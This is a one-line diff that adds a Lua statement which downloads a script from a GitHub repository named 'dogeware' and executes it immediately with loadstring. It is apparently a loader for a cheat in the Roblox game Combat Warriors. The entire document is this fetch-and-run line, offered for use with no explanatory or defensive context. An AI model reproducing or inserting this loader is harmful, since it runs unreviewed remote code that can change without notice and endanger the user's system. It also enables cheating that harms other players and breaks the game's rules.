@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/crosszay1/dogeware/main/combat%20warriars.lua"))()
